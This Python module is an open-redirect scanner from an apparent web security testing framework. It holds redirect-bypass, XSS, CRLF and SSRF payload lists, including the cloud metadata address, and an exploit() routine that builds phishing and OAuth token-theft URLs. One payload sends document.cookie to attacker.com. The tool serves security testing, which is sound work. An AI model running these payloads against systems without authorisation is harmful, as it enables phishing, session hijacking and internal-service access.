import re
from urllib.parse import urlparse, urljoin, quote, unquote
from modules.base import BaseModule
from core.utils import extract_params
from core.http import inject_param


class RedirectModule(BaseModule):
    name = "redirect"
    description = "Open Redirect Scanner"
    exploitable = True
    
    redirect_params = [
        "url", "redirect", "next", "target", "rurl", "dest", "destination",
        "redir", "redirect_uri", "redirect_url", "return", "return_url",
        "returnTo", "return_to", "checkout_url", "continue", "go", "goto",
        "link", "to", "out", "view", "image_url", "forward", "success",
        "failure", "path", "uri", "u", "r", "n", "ref", "site", "html",
        "callback", "feed", "host", "port", "data", "reference", "file",
        "document", "folder", "root", "pg", "window", "navigate", "open",
        "service", "oauth", "saml", "sso", "login_redirect", "after_login",
        "RelayState", "SAMLRequest", "state", "then", "page", "backurl",
    ]
    
    evil_domains = ["evil.com", "attacker.com", "malicious.site"]
    
    protocol_relative_payloads = [
        "//evil.com",
        "///evil.com",
        "////evil.com",
        "/\\evil.com",
        "\\/evil.com",
        "//evil.com/",
        "//evil.com/%2f..",
        "///evil.com/%2f..",
        "////evil.com/%2f..",
        "//\\evil.com",
        "/\\/evil.com",
    ]
    
    protocol_bypass_payloads = [
        "https://evil.com",
        "http://evil.com",
        "https:evil.com",
        "http:evil.com",
        "https:///evil.com",
        "https:\\\\evil.com",
        "HtTpS://evil.com",
        "https://EVIL.COM",
        "https://evil.com:443",
        "https://evil.com:80",
    ]
    
    unicode_bypass_payloads = [
        "//evil%E3%80%82com",
        "//evil。com",
        "//evil%00.com",
        "//evil%0d%0a.com",
        "//evil\u3002com",
        "//evil\uff0ecom",
        "//evil%ef%bc%8ecom",
        "//evil%c0%2ecom",
    ]
    
    at_symbol_payloads = [
        "https://legitimate.com@evil.com",
        "https://evil.com@legitimate.com",
        "https://legitimate.com%40evil.com",
        "https://legitimate.com%2540evil.com",
        "//legitimate.com@evil.com",
        "https://user:pass@evil.com",
    ]
    
    fragment_query_payloads = [
        "https://evil.com#",
        "https://evil.com?",
        "https://evil.com\\",
        "https://evil.com%23.legitimate.com",
        "https://evil.com%2f.legitimate.com",
        "https://evil.com%3f.legitimate.com",
        "https://evil.com/.legitimate.com",
        "//evil.com#.legitimate.com",
        "//evil.com?.legitimate.com",
    ]
    
    whitespace_bypass_payloads = [
        " https://evil.com",
        "\thttps://evil.com",
        "\nhttps://evil.com",
        "\rhttps://evil.com",
        "https://evil.com ",
        "https://evil.com\t",
        "%20https://evil.com",
        "https:%0a//evil.com",
        "https://evil.com%00",
    ]
    
    path_confusion_payloads = [
        "/evil.com",
        "/.evil.com",
        "/\\.evil.com",
        "/evil.com/",
        "//google.com%2f@evil.com",
        "/%2f/evil.com",
        "/%5c/evil.com",
        "/..;/evil.com",
    ]
    
    javascript_payloads = [
        "javascript:alert(document.domain)",
        "javascript://evil.com/%0aalert(1)",
        "javascript:/**/alert(1)",
        "java%0ascript:alert(1)",
        "java%0d%0ascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "javascript://%0aalert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
    ]
    
    crlf_injection_payloads = [
        "//%0d%0aevil.com",
        "/%0d%0aLocation:https://evil.com",
        "https://legitimate.com%0d%0aLocation:https://evil.com",
        "//evil.com%0d%0a%0d%0a<script>alert(1)</script>",
    ]
    
    ssrf_chain_payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://169.254.169.254",
        "http://metadata.google.internal",
    ]
    
    path_prefixes = [
        "/redirect/", "/out/", "/go/", "/goto/", "/r/", "/jump/", "/forward/",
        "/redirect", "/out", "/go", "/goto", "/r", "/jump", "/forward",
        "/link/", "/url/", "/proxy/", "/fetch/", "/load/", "/view/",
        "/external/", "/away/", "/leave/", "/redir/", "/bounce/",
    ]
    
    async def scan(self, target):
        self.findings = []
        self.confirmed_redirects = []
        params = extract_params(target)
        
        redirect_params = self._find_redirect_params(params)
        
        if redirect_params:
            await self._test_open_redirect(target, redirect_params)
        
        await self._test_common_redirect_params(target)
        await self._test_header_based_redirect(target)
        await self._test_path_based_redirect(target)
        await self._test_meta_refresh_redirect(target)
        await self._test_javascript_redirect(target, params)
        await self._test_fragment_redirect(target, params)
        await self._test_redirect_chain(target)
        
        if self.aggressive:
            await self._test_oauth_redirect_bypass(target)
            await self._test_ssrf_via_redirect(target, params)
            await self._test_referrer_leakage(target)
            await self._test_crlf_redirect(target, params)
        
        return self.findings
    
    def _find_redirect_params(self, params):
        found = []
        for param in params:
            if any(rp in param.lower() for rp in self.redirect_params):
                found.append(param)
        return found if found else list(params)
    
    def _build_all_payloads(self):
        all_payloads = []
        all_payloads.extend(self.protocol_relative_payloads)
        all_payloads.extend(self.protocol_bypass_payloads)
        all_payloads.extend(self.unicode_bypass_payloads)
        all_payloads.extend(self.at_symbol_payloads)
        all_payloads.extend(self.fragment_query_payloads)
        all_payloads.extend(self.whitespace_bypass_payloads)
        all_payloads.extend(self.path_confusion_payloads)
        all_payloads.extend(self.javascript_payloads[:5])
        
        file_payloads = self.get_payloads("redirect") or []
        all_payloads.extend(file_payloads)
        
        return list(dict.fromkeys(all_payloads))
    
    async def _test_open_redirect(self, target, params):
        all_payloads = self._build_all_payloads()
        
        for param in params:
            for payload in all_payloads[:50]:
                resp = await self.http.get(
                    inject_param(target, param, payload),
                    allow_redirects=False
                )
                
                if resp.get("status") in [301, 302, 303, 307, 308]:
                    location = resp.get("headers", {}).get("Location", "")
                    
                    redirect_type = self._classify_redirect(location, target, payload)
                    
                    if redirect_type:
                        severity = "HIGH" if redirect_type in ["external", "javascript"] else "MEDIUM"
                        
                        self.add_finding(
                            severity,
                            f"Open Redirect ({redirect_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload[:50]}, Redirects to: {location[:80]}",
                            confidence_evidence=["open_redirect", f"{redirect_type}_redirect"],
                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                        )
                        self.confirmed_redirects.append({
                            "param": param,
                            "payload": payload,
                            "location": location,
                            "type": redirect_type
                        })
                        self.record_success(payload, target)
                        return
                
                elif resp.get("status") == 200:
                    text = resp.get("text", "")
                    
                    js_redirects = self._detect_redirect_patterns(text)
                    for js_url in js_redirects:
                        if any(evil in js_url.lower() for evil in self.evil_domains):
                            self.add_finding(
                                "HIGH",
                                "Open Redirect via JavaScript",
                                url=target,
                                parameter=param,
                                evidence=f"JS redirects to: {js_url[:80]}",
                                confidence_evidence=["js_redirect", "dom_based"]
                            )
                            return
                    
                    if "javascript:" in payload.lower():
                        if payload.lower() in text.lower():
                            self.add_finding(
                                "CRITICAL",
                                "Open Redirect with XSS (javascript: URI)",
                                url=target,
                                parameter=param,
                                evidence=f"JavaScript URI reflected: {payload[:50]}",
                                confidence_evidence=["xss_via_redirect", "javascript_uri"]
                            )
                            return
    
    async def _test_common_redirect_params(self, target):
        base_url = target.split("?")[0]
        
        for param in self.redirect_params[:20]:
            test_payloads = [
                "https://evil.com",
                "//evil.com",
                "/\\/evil.com",
            ]
            
            for payload in test_payloads:
                test_url = f"{base_url}?{param}={quote(payload, safe='')}"
                
                resp = await self.http.get(test_url, allow_redirects=False)
                
                if resp.get("status") in [301, 302, 303, 307, 308]:
                    location = resp.get("headers", {}).get("Location", "")
                    
                    if any(evil in location.lower() for evil in self.evil_domains):
                        self.add_finding(
                            "HIGH",
                            f"Open Redirect via Hidden Parameter '{param}'",
                            url=base_url,
                            parameter=param,
                            evidence=f"Redirects to: {location[:100]}",
                            confidence_evidence=["hidden_param_redirect"],
                            request_data={"method": "GET", "url": test_url}
                        )
                        self.confirmed_redirects.append({"param": param, "type": "hidden"})
                        return
    
    async def _test_header_based_redirect(self, target):
        header_tests = [
            ("Host", "evil.com"),
            ("X-Forwarded-Host", "evil.com"),
            ("X-Original-URL", "https://evil.com"),
            ("X-Rewrite-URL", "https://evil.com"),
            ("X-Host", "evil.com"),
            ("X-Forwarded-Server", "evil.com"),
            ("Forwarded", "host=evil.com"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
        ]
        
        for header, value in header_tests:
            resp = await self.http.get(
                target,
                headers={header: value},
                allow_redirects=False
            )
            
            if resp.get("status") in [301, 302, 303, 307, 308]:
                location = resp.get("headers", {}).get("Location", "")
                
                if any(evil in location.lower() for evil in self.evil_domains):
                    self.add_finding(
                        "HIGH",
                        f"Open Redirect via {header} Header",
                        url=target,
                        evidence=f"Redirects to: {location[:100]}",
                        confidence_evidence=["header_redirect", "host_header_injection"],
                        request_data={"method": "GET", "url": target, "header": header}
                    )
                    self.confirmed_redirects.append({"header": header, "type": "header"})
                    return
            
            elif resp.get("status") == 200:
                text = resp.get("text", "")
                if "evil.com" in text.lower():
                    self.add_finding(
                        "MEDIUM",
                        f"Host Header Reflected via {header}",
                        url=target,
                        evidence=f"Header value reflected in response",
                        confidence_evidence=["header_reflection"]
                    )
    
    async def _test_path_based_redirect(self, target):
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}".rstrip("/")
        
        path_payloads = [
            "https://evil.com",
            "//evil.com",
            "////evil.com",
            "https://attacker.invalid",
            "/\\/evil.com",
            "https:%2f%2fevil.com",
        ]
        
        for prefix in self.path_prefixes[:15]:
            for payload in path_payloads:
                path_part = prefix if prefix.endswith("/") else prefix + "/"
                url = base + path_part + quote(payload, safe='')
                
                resp = await self.http.get(url, allow_redirects=False)
                
                if resp.get("status") in [301, 302, 303, 307, 308]:
                    location = resp.get("headers", {}).get("Location", "")
                    
                    if any(evil in location.lower() for evil in self.evil_domains + ["attacker.invalid"]):
                        self.add_finding(
                            "HIGH",
                            "Path-based Open Redirect",
                            url=url,
                            evidence=f"Path: {prefix}, Redirects to: {location[:80]}",
                            confidence_evidence=["path_redirect"],
                            request_data={"method": "GET", "url": url}
                        )
                        self.confirmed_redirects.append({"path": prefix, "type": "path"})
                        return
    
    async def _test_meta_refresh_redirect(self, target):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        text = resp.get("text", "")
        
        meta_refresh = re.findall(
            r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\']?([^"\'>\s]+)["\']?',
            text, re.I
        )
        
        for content in meta_refresh:
            url_match = re.search(r'url\s*=\s*([^\s"\']+)', content, re.I)
            if url_match:
                redirect_url = url_match.group(1)
                
                try:
                    redirect_host = urlparse(redirect_url).netloc.lower()
                    original_host = urlparse(target).netloc.lower()
                    
                    if redirect_host and redirect_host != original_host:
                        if not redirect_host.endswith("." + original_host):
                            self.add_finding(
                                "MEDIUM",
                                "Meta Refresh Redirect to External Domain",
                                url=target,
                                evidence=f"Redirects to: {redirect_url[:80]}",
                                confidence_evidence=["meta_refresh_redirect"]
                            )
                            return
                except:
                    pass
    
    async def _test_javascript_redirect(self, target, params):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        text = resp.get("text", "")
        
        js_redirects = self._detect_redirect_patterns(text)
        
        for redirect_url in js_redirects:
            for param in params:
                param_value = self._extract_param_value(target, param)
                if param_value and param_value in redirect_url:
                    self.add_finding(
                        "HIGH",
                        "DOM-based Open Redirect",
                        url=target,
                        parameter=param,
                        evidence=f"Parameter reflected in JS redirect: {redirect_url[:80]}",
                        confidence_evidence=["dom_redirect", "client_side"]
                    )
                    return
        
        fragment_based = re.findall(
            r'location\s*[=.]\s*[^;]*(?:hash|location\.hash)',
            text, re.I
        )
        if fragment_based:
            self.add_finding(
                "MEDIUM",
                "Potential Fragment-based Open Redirect",
                url=target,
                evidence="JavaScript uses location.hash for navigation",
                confidence_evidence=["fragment_redirect_potential"]
            )
    
    async def _test_fragment_redirect(self, target, params):
        parsed = urlparse(target)
        
        test_fragments = [
            "#https://evil.com",
            "#//evil.com",
            "#redirect=https://evil.com",
        ]
        
        for fragment in test_fragments:
            test_url = f"{target}{fragment}"
            
            resp = await self.http.get(test_url.split("#")[0])
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "location.hash" in text or "window.location" in text:
                    if "eval" in text or "innerHTML" in text:
                        self.add_finding(
                            "MEDIUM",
                            "Potential Fragment-based Redirect/XSS",
                            url=target,
                            evidence="Hash used with unsafe DOM operations",
                            confidence_evidence=["fragment_based_vuln"]
                        )
                        return
    
    async def _test_redirect_chain(self, target):
        chain = []
        url = target
        max_hops = 15
        external_hops = []
        
        parsed_base = urlparse(target)
        base_netloc = parsed_base.netloc.lower()
        
        for _ in range(max_hops):
            resp = await self.http.get(url, allow_redirects=False)
            status = resp.get("status")
            
            if not status:
                break
            
            loc = (resp.get("headers") or {}).get("Location", "")
            chain.append({"url": url, "status": status, "location": loc})
            
            if status not in (301, 302, 303, 307, 308) or not loc:
                break
            
            try:
                full_loc = urljoin(url, loc)
                loc_netloc = urlparse(full_loc).netloc.lower()
                
                if loc_netloc and loc_netloc != base_netloc:
                    if not loc_netloc.endswith("." + base_netloc):
                        external_hops.append({"from": url, "to": full_loc})
                
                url = full_loc
            except:
                break
        
        if len(chain) > 5:
            self.add_finding(
                "LOW",
                f"Long Redirect Chain ({len(chain)} hops)",
                url=target,
                evidence=f"Chain: {' -> '.join([c['url'][:30] for c in chain[:5]])}...",
                confidence_evidence=["redirect_chain"]
            )
        
        if external_hops:
            self.add_finding(
                "MEDIUM",
                f"Redirect Chain Leaves Domain ({len(external_hops)} external hops)",
                url=target,
                evidence=f"External: {external_hops[0]['to'][:80]}",
                confidence_evidence=["external_redirect_chain"]
            )
    
    async def _test_oauth_redirect_bypass(self, target):
        oauth_endpoints = [
            "/oauth/authorize",
            "/oauth2/authorize", 
            "/auth/authorize",
            "/authorize",
            "/login/oauth/authorize",
            "/api/oauth/authorize",
            "/connect/authorize",
        ]
        
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        bypass_redirect_uris = [
            "https://evil.com",
            "https://legitimate.com.evil.com",
            "https://legitimate.com%40evil.com",
            "https://legitimate.com/.evil.com",
            "https://legitimate.com%252f.evil.com",
            "https://legitimate.com@evil.com",
            "https://legitimate.com#.evil.com",
            "//evil.com",
        ]
        
        for endpoint in oauth_endpoints:
            url = urljoin(base, endpoint)
            
            resp = await self.http.get(url)
            if resp.get("status") not in [200, 302, 400, 401]:
                continue
            
            for bypass in bypass_redirect_uris[:5]:
                params = f"?client_id=test&redirect_uri={quote(bypass, safe='')}&response_type=code"
                test_url = url + params
                
                resp = await self.http.get(test_url, allow_redirects=False)
                
                if resp.get("status") in [302, 303, 307]:
                    location = resp.get("headers", {}).get("Location", "")
                    
                    if "evil.com" in location.lower():
                        self.add_finding(
                            "CRITICAL",
                            "OAuth redirect_uri Bypass",
                            url=url,
                            evidence=f"Bypass payload accepted: {bypass[:50]}",
                            confidence_evidence=["oauth_bypass", "token_theft_possible"],
                            request_data={"method": "GET", "url": test_url}
                        )
                        return
    
    async def _test_ssrf_via_redirect(self, target, params):
        redirect_params = self._find_redirect_params(params)
        
        for param in redirect_params[:3]:
            for ssrf_target in self.ssrf_chain_payloads:
                resp = await self.http.get(
                    inject_param(target, param, ssrf_target),
                    allow_redirects=False
                )
                
                if resp.get("status") in [301, 302, 303, 307, 308]:
                    location = resp.get("headers", {}).get("Location", "")
                    
                    if any(s in location for s in ["127.0.0.1", "localhost", "169.254", "metadata"]):
                        self.add_finding(
                            "HIGH",
                            "SSRF via Open Redirect",
                            url=target,
                            parameter=param,
                            evidence=f"Internal redirect: {location[:80]}",
                            confidence_evidence=["ssrf_redirect", "internal_access"]
                        )
                        return
    
    async def _test_referrer_leakage(self, target):
        resp = await self.http.get(target)
        
        if not resp.get("status"):
            return
        
        headers = {k.lower(): v for k, v in resp.get("headers", {}).items()}
        
        referrer_policy = headers.get("referrer-policy", "")
        
        if not referrer_policy or referrer_policy in ["unsafe-url", "no-referrer-when-downgrade"]:
            text = resp.get("text", "")
            
            external_links = re.findall(r'href=["\']https?://(?!{})([^"\']+)["\']'.format(
                re.escape(urlparse(target).netloc)
            ), text, re.I)
            
            if external_links and self.confirmed_redirects:
                self.add_finding(
                    "MEDIUM",
                    "Referrer Leakage via Open Redirect",
                    url=target,
                    evidence=f"Weak referrer policy with external links",
                    confidence_evidence=["referrer_leak", "token_leak_risk"]
                )
    
    async def _test_crlf_redirect(self, target, params):
        redirect_params = self._find_redirect_params(params)
        
        for param in redirect_params[:3]:
            for payload in self.crlf_injection_payloads:
                resp = await self.http.get(
                    inject_param(target, param, payload),
                    allow_redirects=False
                )
                
                if resp.get("status"):
                    headers = resp.get("headers", {})
                    
                    location_count = sum(1 for k in headers if k.lower() == "location")
                    
                    if location_count > 1:
                        self.add_finding(
                            "HIGH",
                            "CRLF Injection in Redirect",
                            url=target,
                            parameter=param,
                            evidence=f"Multiple Location headers injected",
                            confidence_evidence=["crlf_redirect", "response_splitting"]
                        )
                        return
                    
                    for header, value in headers.items():
                        if "evil.com" in value.lower() and header.lower() != "location":
                            self.add_finding(
                                "HIGH",
                                "Header Injection via Redirect Parameter",
                                url=target,
                                parameter=param,
                                evidence=f"Injected header: {header}",
                                confidence_evidence=["header_injection"]
                            )
                            return
    
    def _classify_redirect(self, location, original_url, payload):
        if not location:
            return None
        
        location_lower = location.lower()
        
        if any(evil in location_lower for evil in self.evil_domains):
            return "external"
        
        if location_lower.startswith("javascript:"):
            return "javascript"
        
        if location_lower.startswith("data:"):
            return "data_uri"
        
        try:
            original_host = urlparse(original_url).netloc.lower()
            redirect_host = urlparse(location).netloc.lower()
            
            if redirect_host and redirect_host != original_host:
                if not redirect_host.endswith("." + original_host):
                    return "external"
        except:
            pass
        
        if payload.lower() in location_lower:
            return "payload_reflected"
        
        return None
    
    def _detect_redirect_patterns(self, text):
        patterns = [
            re.compile(r'window\.location\s*=\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'location\.href\s*=\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'location\.replace\s*\(["\']([^"\']+)["\']', re.I),
            re.compile(r'location\.assign\s*\(["\']([^"\']+)["\']', re.I),
            re.compile(r'window\.open\s*\(["\']([^"\']+)["\']', re.I),
            re.compile(r'http-equiv=["\']refresh["\'][^>]+url=([^"\'>\s]+)', re.I),
            re.compile(r'\.navigate\s*\(["\']([^"\']+)["\']', re.I),
            re.compile(r'window\.location\.href\s*=\s*([^;\n]+)', re.I),
        ]
        
        redirects = []
        for pattern in patterns:
            matches = pattern.findall(text)
            redirects.extend(matches)
        
        return list(set(redirects))
    
    def _extract_param_value(self, url, param):
        match = re.search(rf'{re.escape(param)}=([^&]+)', url)
        return unquote(match.group(1)) if match else None
    
    async def exploit(self, target, finding):
        exploits = {
            "phishing_poc": None,
            "oauth_theft_poc": None,
            "session_theft_poc": None,
        }
        
        param = finding.get("parameter")
        
        if not param and not self.confirmed_redirects:
            return None
        
        if self.confirmed_redirects:
            redirect = self.confirmed_redirects[0]
            
            if redirect.get("type") == "external" or redirect.get("type") == "hidden":
                phishing_url = target
                if redirect.get("param"):
                    phishing_url = inject_param(target, redirect["param"], "https://phishing-site.com/fake-login")
                
                exploits["phishing_poc"] = {
                    "type": "phishing",
                    "url": phishing_url,
                    "description": "Redirect user to fake login page",
                    "curl": f'curl -I "{phishing_url}"'
                }
                
                oauth_url = inject_param(
                    target,
                    redirect.get("param", param),
                    "https://attacker.com/steal-token?code="
                )
                
                exploits["oauth_theft_poc"] = {
                    "type": "oauth_theft",
                    "url": oauth_url,
                    "description": "Steal OAuth tokens via redirect",
                    "scenario": "1. Victim clicks crafted link\n2. Logs into OAuth provider\n3. Token sent to attacker"
                }
            
            if redirect.get("type") == "javascript":
                exploits["session_theft_poc"] = {
                    "type": "xss_session_theft",
                    "payload": "javascript:document.location='https://attacker.com/?c='+document.cookie",
                    "description": "Steal session cookies via javascript: URI"
                }
        
        if any(exploits.values()):
            self.add_finding(
                "CRITICAL",
                "Open Redirect Exploited",
                url=target,
                evidence=f"PoC generated for phishing/token theft"
            )
            
            self.exploited_data = exploits
            return exploits
        
        return None
